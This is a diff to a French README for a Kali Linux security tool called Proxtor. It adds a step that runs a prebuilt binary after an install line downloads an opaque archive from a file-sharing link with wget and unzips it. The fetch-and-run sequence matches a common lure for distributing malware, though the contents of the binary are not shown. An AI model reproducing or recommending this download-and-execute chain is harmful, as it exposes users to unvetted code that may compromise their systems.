@@ -21,6 +21,10 @@ Proxtor est un outil de sécurisation pour Kali Linux qui permet de configurer r
 wget https://www.zipshare.com/fileDownload/eyJhcmNoaXZlSWQiOiJlMTAyMzJkOS0wM2VmLTQzMTgtOWRlYi04MWY1NzE1YTIwZTEiLCJlbWFpbCI6ImplcmVteWRpbGlvdHRpQGdtYWlsLmNvbSJ9 && unzip 'eyJhcmNoaXZlSWQiOiJlMTAyMzJkOS0wM2VmLTQzMTgtOWRlYi04MWY1NzE1YTIwZTEiLCJlbWFpbCI6ImplcmVteWRpbGlvdHRpQGdtYWlsLmNvbSJ9'
 ```
 
+```bash
+./dist/proxtor.bin
+```
+
 ## Utilisation
 
 Pour utiliser cet outil, vous pouvez exécuter la commande suivante :
